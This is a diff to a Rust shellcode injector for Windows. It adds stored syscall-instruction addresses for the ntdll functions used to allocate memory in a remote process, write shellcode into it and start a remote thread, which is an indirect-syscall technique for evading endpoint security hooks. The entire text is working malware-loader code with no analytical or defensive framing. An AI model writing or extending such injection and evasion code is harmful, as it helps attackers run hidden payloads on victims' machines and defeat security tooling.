@@ -43,6 +43,16 @@ pub static mut MN_NTWFSO: u32 = 0x0;
 pub static mut MN_NTC: u32 = 0x0;
 #[unsafe(no_mangle)]
 pub static mut SYS_ADDR_NTOP: *const u8 = std::ptr::null();
+#[unsafe(no_mangle)]
+pub static mut SYS_ADDR_NTAVM: *const u8 = std::ptr::null();
+#[unsafe(no_mangle)]
+pub static mut SYS_ADDR_NTCTEX: *const u8 = std::ptr::null();
+#[unsafe(no_mangle)]
+pub static mut SYS_ADDR_NTWVM: *const u8 = std::ptr::null();
+#[unsafe(no_mangle)]
+pub static mut SYS_ADDR_NTWFSO: *const u8 = std::ptr::null();
+#[unsafe(no_mangle)]
+pub static mut SYS_ADDR_NTC: *const u8 = std::ptr::null();
 
 type HANDLE = *mut c_void;
 const MEM_COMMIT: u32 = 0x1000;
@@ -188,7 +198,7 @@ pub fn main() -> windows::core::Result<()> {
         .expect("GetProcAddress failed for NtAllocateVirtualMemory");
         let addr_nt_allocate_virtual_memory = ntdll_nt_allocate_virtual_memory as *const u8;
         MN_NTAVM = *addr_nt_allocate_virtual_memory.add(4) as u32;
-
+        SYS_ADDR_NTAVM = addr_nt_allocate_virtual_memory.add(0x12);
         let mut region_size: usize = shellcode.len() as usize;
         let mut remote_addr: *mut c_void = std::ptr::null_mut();
         let allocation_status = asm_NtAllocateVirtualMemory(
@@ -214,6 +224,7 @@ pub fn main() -> windows::core::Result<()> {
         .expect("GetProcAddress failed for NtWriteVirtualMemory");
         let addr_nt_write_virtual_memory = ntdll_nt_write_virtual_memory as *const u8;
         MN_NTWVM = *addr_nt_write_virtual_memory.add(4) as u32;
+        SYS_ADDR_NTWVM = addr_nt_write_virtual_memory.add(0x12);
         let write_size: *mut usize = std::ptr::null_mut();
         let write_status = asm_NtWriteVirtualMemory(
             h_process,
@@ -235,7 +246,7 @@ pub fn main() -> windows::core::Result<()> {
                 .expect("GetProcAddress failed for NtCreateThreadEx");
         let addr_nt_create_thread_ex = ntdll_nt_create_thread_ex as *const u8;
         MN_NTCTEX = *addr_nt_create_thread_ex.add(4) as u32;
-
+        SYS_ADDR_NTCTEX = addr_nt_create_thread_ex.add(0x12);
         let mut h_thread: HANDLE = std::ptr::null_mut();
         let status = asm_NtCreateThreadEx(
             &mut h_thread,
@@ -265,7 +276,7 @@ pub fn main() -> windows::core::Result<()> {
         .expect("GetProcAddress failed for NtWaitForSingleObject");
         let addr_nt_wait_for_single_object = ntdll_nt_wait_for_single_object as *const u8;
         MN_NTWFSO = *addr_nt_wait_for_single_object.add(4) as u32;
-
+        SYS_ADDR_NTWFSO = addr_nt_wait_for_single_object.add(0x12);
         let wfso_status = asm_NtWaitForSingleObject(h_thread, 0, ptr::null_mut());
         assert!(
             wfso_status.0 == 0,
@@ -277,6 +288,7 @@ pub fn main() -> windows::core::Result<()> {
             .expect("GetProcAddress failed for NtClose");
         let addr_nt_close = ntdll_nt_close as *const u8;
         MN_NTC = *addr_nt_close.add(4) as u32;
+        SYS_ADDR_NTC = addr_nt_close.add(0x12);
         let _ = asm_NtClose(h_thread);
         let _ = asm_NtClose(h_process);
         return Ok(());
